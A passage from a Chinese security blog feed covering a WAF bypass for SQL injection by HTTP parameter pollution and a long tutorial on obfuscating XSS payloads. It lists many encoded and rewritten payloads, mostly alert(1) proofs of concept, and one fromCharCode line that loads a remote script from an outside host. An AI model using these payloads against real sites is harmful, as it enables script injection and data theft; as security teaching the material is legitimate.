class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="HPP分割参数绕过"><a href="#HPP分割参数绕过" class="headerlink" title="HPP分割参数绕过"></a>HPP分割参数绕过</h3><h4 id="绕过原理-4"><a href="#绕过原理-4" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：HTTP参数污染</strong></p>
<p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
<p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
<p>UNION、SELECT、FROM 三个关键字分别放在GET/POST/COOKIE的位置，通过ASPX的这个特性连起来，堪称完美的一个姿势，压根不好防。</p>
<p>但姿势利用太过于局限： 使用Request.Params[“id”]来获取参数,G-P-C获取到参数拼接起来，仅仅作为Bypass分享一种思路而已。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nxzhYKqy6N2ked4h26t90woffPY1UxcJt6cQhMdzlicibZJNte04WjFeJf5cEkibVfGGK3fgXr9h5UA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>GET型请求转POST型</li>
<li>参数传递的顺序：GET-&gt;POST-&gt;COOKIE</li>
<li>使用多行注释符/**/来闭合分割参数的逗号</li>
</ul>
<p><img src="https://i.loli.net/2021/10/27/SxH8TCOv2LsNBgQ.png" alt="image-20211027201228560"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>ZP《Bypass安全狗mysql注入》</li>
<li><a href="https://cloud.tencent.com/developer/article/1856698?from=article.detail.1631936">SQL注入 安全狗apache4.0.26655绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1631936?from=article.detail.1856683">Fuzz绕过安全狗4.0实现SQL注入 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1856683">SQL注入-安全狗超大数据包绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://blog.csdn.net/weixin_50464560/article/details/120182543">Bypass WAF之HTTP参数污染(HPP)漏洞挖掘_J0hnson666的博客-CSDN博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS的混淆与绕过</title>
    <url>/post/8bdb3c95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="编码混淆"><a href="#编码混淆" class="headerlink" title="编码混淆"></a>编码混淆</h2><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>有一些字符在HTML文档中有特殊的含义，例如<code>&lt;</code>和<code>&gt;</code>字符。</p>
<p>要在内容中使用这些字符而不被解释为HTML，就可以使用HTML实体。</p>
<blockquote>
<p>如 <code>&amp;#lt;</code>、<code>&amp;#60;</code>、<code>&amp;#x3c;</code>都可以被解码成常见的小于号 <code>&lt;</code> 。其中 <code>&amp;#lt;</code>叫做<strong>实体名称</strong>，<code>&amp;#60;</code> 和<code>&amp;#x3c;</code>叫做<strong>实体编号</strong>（前者为十进制，后者为十六进制），效果其实是一样的。</p>
</blockquote>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javasc<span class="symbol">&amp;#114;</span>ipt:ale<span class="symbol">&amp;#114;</span>t(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/08/7A6fjVytw8dGPgF.png" alt="image-20211108231434614"></p>
<blockquote>
<p>注：若需要在地址栏直接输入执行，还需要对其再进行URL编码才可执行。</p>
<p>不能对属性名或事件名进行html编码，否则会导致原先的属性或事件无效。</p>
</blockquote>
<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。</p>
<p>但是RFC3986 协议规定encodeURI 方法不会对ASCII字母、数字、~!@#$&amp;*()=:/,;?+’ 编码，所以现在大部分URL编码工具并不会对英文字符进行编码，需要自己手动查表。</p>
<p>URL编码查询表：<a href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">https://www.w3school.com.cn/tags/html_ref_urlencode.asp</a></p>
<p>URL编码工具：<a href="https://www.iamwawa.cn/urldecode.html">https://www.iamwawa.cn/urldecode.html</a></p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">h</span>%<span class="attr">72ef</span>=<span class="string">&quot;javasc%72ipt:ale%72t(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/09/RMjkaHZp76AqQXT.png" alt="image-20211109171644848"></p>
<p>将参数带入查询时浏览器会自动进行URL解码。</p>
<h4 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a>双重编码</h4><p>有的时候，应用程序会在字符串再次解码之前，对其执行XSS过滤，这样就会给我们留下实现绕过的可乘之机。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">双重编码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">%253C</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">%253E</td>
</tr>
<tr>
<td style="text-align:center">(</td>
<td style="text-align:center">%2528</td>
</tr>
<tr>
<td style="text-align:center">)</td>
<td style="text-align:center">%2529</td>
</tr>
<tr>
<td style="text-align:center">“</td>
<td style="text-align:center">%2522</td>
</tr>
<tr>
<td style="text-align:center">‘</td>
<td style="text-align:center">%2527</td>
</tr>
</tbody>
</table>
</div>
<h3 id="JavaScript编码"><a href="#JavaScript编码" class="headerlink" title="JavaScript编码"></a>JavaScript编码</h3><p>JS编码广义上就是一般转义字符、八进制转义字符、十六进制转义字符、Unicode编码的表现。</p>
<h4 id="一般转义字符"><a href="#一般转义字符" class="headerlink" title="一般转义字符"></a>一般转义字符</h4><p>所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”\”来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>转义字符</th>
<th>意义</th>
<th>ASCII码值（十进制）</th>
</tr>
</thead>
<tbody>
<tr>
<td>\a</td>
<td>响铃(BEL)</td>
<td>007</td>
</tr>
<tr>
<td>\b</td>
<td>退格(BS) ，将当前位置移到前一列</td>
<td>008</td>
</tr>
<tr>
<td>\f</td>
<td>换页(FF)，将当前位置移到下页开头</td>
<td>012</td>
</tr>
<tr>
<td>\n</td>
<td>换行(LF) ，将当前位置移到下一行开头</td>
<td>010</td>
</tr>
<tr>
<td>\r</td>
<td>回车(CR) ，将当前位置移到本行开头</td>
<td>013</td>
</tr>
<tr>
<td>\t</td>
<td>水平制表(HT) （跳到下一个TAB位置）</td>
<td>009</td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表(VT)</td>
<td>011</td>
</tr>
<tr>
<td>\</td>
<td>代表一个反斜线字符’’\’</td>
<td>092</td>
</tr>
<tr>
<td>\’</td>
<td>代表一个单引号（撇号）字符</td>
<td>039</td>
</tr>
<tr>
<td>\”</td>
<td>代表一个双引号字符</td>
<td>034</td>
</tr>
<tr>
<td>\?</td>
<td>代表一个问号</td>
<td>063</td>
</tr>
<tr>
<td>\0</td>
<td>空字符(NULL)</td>
<td>000</td>
</tr>
</tbody>
</table>
</div>
<h4 id="八进制转义字符"><a href="#八进制转义字符" class="headerlink" title="八进制转义字符"></a>八进制转义字符</h4><p>使用三位数字表示，不足位数用0补充，按8位原字符八进制字符编码。</p>
<p>在JavaScript中不能直接使用八进制编码，需要使用eval等函数进行执行。</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:eval(&#x27;\141\154\145\162\164\050\061\051&#x27;);&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">content[</span>&#x27;\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">frames[</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=setInterval(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="十六进制转义字符"><a href="#十六进制转义字符" class="headerlink" title="十六进制转义字符"></a>十六进制转义字符</h4><p>使用两位数字表示，不足位数用0补充，按8位原字符16进制字符编码，前缀为 x 。</p>
<p>在JavaScript中不能直接使用十六进制编码，需要使用eval等函数进行执行。</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:eval(&#x27;\x61\x6c\x65\x72\x74\x28\x31\x29&#x27;);&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">content[</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>&#x27;](<span class="attr">1</span>)&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">frames[</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\x61\x6c\x65\x72\x74\x28\x31\x29&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=Set.constructor`al\x65rt\x281\x29```&gt;</span><br><span class="line">    </span><br><span class="line">&lt;svg/onload=Map.constructor`al\x65rt\x281\x29```&gt;</span><br><span class="line">    </span><br><span class="line">&lt;svg/onload=clear.constructor`al\x65rt\x281\x29```&gt;</span><br><span class="line">    </span><br><span class="line">&lt;svg/onload=Array.constructor`al\x65rt\x281\x29```&gt;</span><br><span class="line">    </span><br><span class="line">&lt;svg/onload=WeakSet.constructor`al\x65rt\x281\x29```&gt; </span><br></pre></td></tr></table></figure>
<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>Unicode字符集编码全称：Universal Multiple-Octet Coded Character Set，通用多八位编码字符集。Unicode字符集是国际组织制定的可以容纳世界上所有文字和符号的编码方案。</p>
<p>在JavaScript中Unicode使用四位数字表示，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀为 u 。</p>
<p>Unicode是可以直接将JavaScript中的函数进行转义并执行的。</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>XSS Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:al\u0065rt(1)&quot;</span>&gt;</span>XSS Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:al\u&#123;65&#125;rt(1)&quot;</span>&gt;</span>XSS Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=\u0073\u0065\u0074\u0049\u006e\u0074\u0065\u0072\u0076\u0061\u006c(&#x27;\u0061\u006c\u0065\u0072\u0074(1)&#x27;)&gt;</span><br></pre></td></tr></table></figure>
<p>Unicode编码转换工具：<a href="https://oktools.net/unicode">https://oktools.net/unicode</a></p>
<h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>JavaScript中的fromCharCode() 方法可以将ASCII码转换为字符串。</p>
<p>我们可以将转换后的字符串通过eval函数进行执行。</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,50,51,46,52,50,47,120,115,115,46,106,115,62,60,47,115,99,114,105,112,116,62))&gt;</span><br></pre></td></tr></table></figure>
<p>ASCII码转换工具：<a href="https://www.asciim.cn/m/tools/convert_string_to_ascii.html">https://www.asciim.cn/m/tools/convert_string_to_ascii.html</a></p>
<h3 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h3><p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p>
<p>利用伪协议base64解码执行XSS</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Base64编码转换工具：<a href="https://www.qqxiuzi.cn/bianma/base64.htm">https://www.qqxiuzi.cn/bianma/base64.htm</a></p>
<h3 id="怪异的“乱码”"><a href="#怪异的“乱码”" class="headerlink" title="怪异的“乱码”"></a>怪异的“乱码”</h3><p>下列的编码看似“乱码”实际上有规律可循。虽然在实战应用中会因为长度的原因受到种种限制几乎用不到，但是在CTF比赛中却常常能看到。</p>
<h4 id="JSFuck编码"><a href="#JSFuck编码" class="headerlink" title="JSFuck编码"></a>JSFuck编码</h4><p>JSFuck仅仅使用6种符号来编写代码。它们分别是<code>(</code>、<code>)</code>、<code>+</code>、<code>[</code>、<code>]</code>、<code>!</code>。</p>
<p><img src="https://i.loli.net/2021/11/08/vT8OeJWDGUmnwxi.png" alt="image-20211108200213417"></p>
<p>编码工具：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p>
<h4 id="JSF-ck编码"><a href="#JSF-ck编码" class="headerlink" title="JSF$ck编码"></a>JSF$ck编码</h4><p>JSF$ck是JSFuck的分支版本，使用 <strong>+!{}[]$`</strong> 代替 <strong>+()![]</strong> 。</p>
<p><img src="https://i.loli.net/2021/11/08/n7P4iKEs5TYOMuG.png" alt="image-20211108200354765"></p>
<p>Github地址：<a href="https://github.com/centime/jsfsck">https://github.com/centime/jsfsck</a></p>
<p>官方的编码网站已经停止运营，国内知晓这个编码的人也少之又少。</p>
<h4 id="Jother编码"><a href="#Jother编码" class="headerlink" title="Jother编码"></a>Jother编码</h4><p>只用 <strong>! + ( ) [ ] { } </strong>这八个字符就能完成对任意字符串的编码。</p>
<p><img src="https://i.loli.net/2021/11/09/o8usqnLJiBCQ3m5.png" alt="image-20211108201103388"></p>
<p>编码工具：<a href="https://vulsee.com/tools/jother/index.htm">https://vulsee.com/tools/jother/index.htm</a></p>
<h4 id="JJEncode编码"><a href="#JJEncode编码" class="headerlink" title="JJEncode编码"></a>JJEncode编码</h4><p>JJEncoder是将JavaScript代码转换成只有符号的字符串编码。</p>
<blockquote>
<p>温馨提示：</p>
<p>JJEncode加密后的JavaScript代码非常容易解码。</p>
<p>JJEncode不是实用的代码混淆工具，只是一个编码器。</p>
<p>JJEncode加密后的代码太有特色了，容易被发现的；同时运行加密后的代码依赖于浏览器，不能在某种浏览器上正常运行。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/11/08/r6ZjSenoUmfQMGd.png" alt="image-20211108201306352"></p>
<p>编码工具：<a href="https://utf-8.jp/public/jjencode.html">https://utf-8.jp/public/jjencode.html</a></p>
<h4 id="AAEncode编码"><a href="#AAEncode编码" class="headerlink" title="AAEncode编码"></a>AAEncode编码</h4><p>AAEncoder是JavaScript代码转换成颜文字网络表情的编码。</p>
<p><img src="https://i.loli.net/2021/11/08/deUoOCyQDscJF6H.png" alt="image-20211108201941251"></p>
<p>编码工具：<a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></p>
<h3 id="常用编码转换工具推荐"><a href="#常用编码转换工具推荐" class="headerlink" title="常用编码转换工具推荐"></a>常用编码转换工具推荐</h3><ul>
<li><p>CyberChef</p>
<p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
</li>
<li><p>XSSEE</p>
<p><a href="https://evilcos.me/lab/xssee/">https://evilcos.me/lab/xssee/</a></p>
</li>
<li><p>XSS’OR</p>
<p><a href="https://xssor.io/">https://xssor.io/</a></p>
</li>
</ul>
<h2 id="函数变形混淆"><a href="#函数变形混淆" class="headerlink" title="函数变形混淆"></a>函数变形混淆</h2><p>我们可以将<code>alert(1)</code>函数转换为以下对应形式。</p>
<h4 id="符号替代"><a href="#符号替代" class="headerlink" title="符号替代"></a>符号替代</h4><p>括号() 可以由 反引号`来替代；引号”‘ 可以由 斜杠/来替代，.source可以返回被斜杠引用的内容。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"></span><br><span class="line">alert(<span class="regexp">/1/</span>.source)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="数组操作方法"><a href="#数组操作方法" class="headerlink" title="数组操作方法"></a>数组操作方法</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>].find(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].findIndex(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].some(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].every(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].forEach(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].filter(alert)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>].map(alert)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Map</span>()).set(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>).forEach(alert)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;1&#x27;</span>])).forEach(alert)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="正则表达式替换"><a href="#正则表达式替换" class="headerlink" title="正则表达式替换"></a>正则表达式替换</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;~a~le~rt~~(~~1~~)~&#x27;</span>.replace(<span class="regexp">/~/g</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="regexp">/~a~le~rt~~(~~1~~)~/</span>.source.replace(<span class="regexp">/~/g</span>, <span class="keyword">new</span> <span class="built_in">String</span>()))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span>.replace(<span class="regexp">/.*/</span>,alert)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="窗口对象执行方法"><a href="#窗口对象执行方法" class="headerlink" title="窗口对象执行方法"></a>窗口对象执行方法</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(self)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(<span class="built_in">this</span>)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(<span class="built_in">window</span>)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(parrent)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(top)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(frames)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(content)[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(top)[<span class="regexp">/al/</span>.source+<span class="regexp">/ert/</span>.source](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(self)[<span class="string">&quot;\141\154\145\162\164&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(self)[<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>)](<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="字符串转换"><a href="#字符串转换" class="headerlink" title="字符串转换"></a>字符串转换</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">top[<span class="number">8680439.</span>.toString(<span class="number">30</span>)](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">top[<span class="number">11189117.</span>.toString(<span class="number">32</span>)](<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ol>
<li><p><code>alert</code>字符串用<code>parseInt</code>函数，以基数为30转化后为8680439</p>
<p><code>parseInt(&#39;alert&#39;,30) ==&gt; 8680439</code></p>
</li>
</ol>
<ol>
<li><p><code>toString</code>函数将返回的数字8680439，以基数为30还原</p>
<p><code>8680439..toString(30) ==&gt; &#39;alert&#39;</code></p>
</li>
</ol>
<h4 id="函数多样调用"><a href="#函数多样调用" class="headerlink" title="函数多样调用"></a>函数多样调用</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert.call(<span class="literal">null</span>,<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alert.apply(<span class="literal">null</span>,[<span class="string">&#x27;param&#x27;</span>])</span><br><span class="line"></span><br><span class="line">alert.bind()(<span class="string">&#x27;param&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Reflect.apply(alert,null,[&#x27;param&#x27;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setTimeout`alert()`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(alert)(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`$&#123;alert(1)&#125;`</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h4 id="新建函数调用"><a href="#新建函数调用" class="headerlink" title="新建函数调用"></a>新建函数调用</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;)()</span><br><span class="line"></span><br><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;()</span><br><span class="line"></span><br><span class="line">%2<span class="function"><span class="title">bfunction</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;()</span><br><span class="line"></span><br><span class="line">%2<span class="function"><span class="title">dfunction</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;()</span><br><span class="line"></span><br><span class="line">~<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;()</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;alert(1)&#x27;</span>))()</span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x281\x29`</span><span class="string">``</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>)&#125;;x()</span><br><span class="line"></span><br><span class="line">x=<span class="function"><span class="params">x</span>=&gt;</span>&#123;alert(<span class="number">1</span>)&#125;,x()</span><br><span class="line"></span><br><span class="line">x=<span class="function"><span class="params">x</span>=&gt;</span>&#123;alert(<span class="number">1</span>)&#125;,toString=x,<span class="built_in">window</span>+<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;<span class="keyword">throw</span> <span class="number">1</span>&#125;<span class="keyword">catch</span>(e)&#123;alert(e)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">&#x27;alert(1)&#x27;</span></span><br><span class="line"></span><br><span class="line">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> onerror=alert,<span class="regexp">/1/</span>.source</span><br><span class="line"></span><br><span class="line">_=<span class="built_in">window</span>;_.onerror=_[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>];<span 